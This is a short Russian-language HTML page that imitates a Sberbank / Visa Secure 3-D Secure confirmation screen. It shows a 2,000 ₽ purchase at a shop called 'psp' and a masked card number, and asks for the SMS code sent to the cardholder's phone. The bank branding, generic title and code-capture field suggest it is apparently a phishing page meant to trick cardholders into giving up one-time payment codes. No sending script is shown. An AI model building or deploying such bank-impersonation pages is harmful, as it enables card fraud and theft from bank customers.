<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="css/check/check2.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <section>
        <div class="wraper">
            <div class="logo">
                <img src="img/chek/sberbankLogo.png" alt="">
                <img src="img/chek/visasecure.png" alt="">
            </div>
            <div class="info">
                <div class="info__price">
                    <h1>2 000 ₽</h1>
                </div>
                <div class="info__place">
                    <p>Магазин</p>
                    <p>psp</p>
                </div>
                <div class="info__card">
                    <p>Номер карты</p>
                    <p>** 4004</p>
                </div>
                <div class="info__date">
                    <p>Дата</p>
                    <p>
                        07.07.2022
                    </p>
                </div>
            </div>
            <div class="text">
                <h2>Отправили Код</h2>
                <p>Для его получения ваш номер должен быть подключен к СМС-банку</p>
            </div>
            <div class="input-info">
                <p>Введите код для оплаты покупки</p>
                <input name="kod" class="" autocomplete="tel-country-code" pattern="[0-9]*" type="text">
                <button class="input-info__btn" type="submit">получить новый код</button>
                <p class="hide">Или подключить <a href="#">СМС-банк</a></p>
            </div>
            <div class="lock">
                <a href="">Отменить</a>
                <a href="">Безопасность</a>
            </div>
        </div>
    </section>
</body>

</html>
